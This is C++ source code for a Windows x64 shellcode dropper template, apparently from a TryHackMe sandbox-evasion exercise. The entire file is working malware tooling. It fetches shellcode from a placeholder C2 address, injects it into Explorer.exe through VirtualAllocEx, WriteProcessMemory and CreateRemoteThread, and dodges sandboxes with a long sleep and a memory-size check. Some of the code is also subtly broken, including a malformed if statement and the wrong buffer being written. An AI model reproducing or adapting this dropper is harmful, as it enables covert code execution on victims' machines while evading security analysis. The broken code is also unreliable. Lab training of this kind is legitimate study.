/***********************************************************************
/   Simple Shellcode-dropper template for Windows x64 Architecture
/   used in the THM Sandbox evasion Room. For educational purpose only.
/
/   TODO: implement common evasion techniques.
/
************************************************************************/
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

// Update SHELLCODE_SIZE with your shellcode size in bytes. This should be approximately 510 bytes. 
const int SHELLCODE_SIZE = 510;
// PID of Explorer.exe for use in OpenProcess() API call. Find this using Windows Task Manager or Process Explorer.
const int EXPLORER_PID = 5780;

bool memoryCheck() {
    // Check memory size. Most sandboxes use low specs to limit the imact on the host system.
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    // Check if more then 2GB. Adjust this to your meet your requirements.
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 2.00) {
        return true;
    }
    else {
        return false;
    }
}

int downloadAndExecute() {

    HANDLE hProcess;
    SIZE_T dwSize = SHELLCODE_SIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, EXPLORER_PID);

    // Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://yourc2ip/shellcode.raw";
    
    IStream* stream;
    char buff[SHELLCODE_SIZE];
    unsigned long bytesRead;
    string s;
    // Open URL stream and download payload
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, SHELLCODE_SIZE, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    // Allocate memory...
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);
    // ...and execute our payload.
    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    // Try to sleep through sandbox...
    Sleep(60000);
    
    // Only drop and run payload if we are not sandboxed (-anymore-)...
    if memoryCheck() == true {
        downloadAndExecute();
    }
    else {
        return 0;
    }

    return 0;
}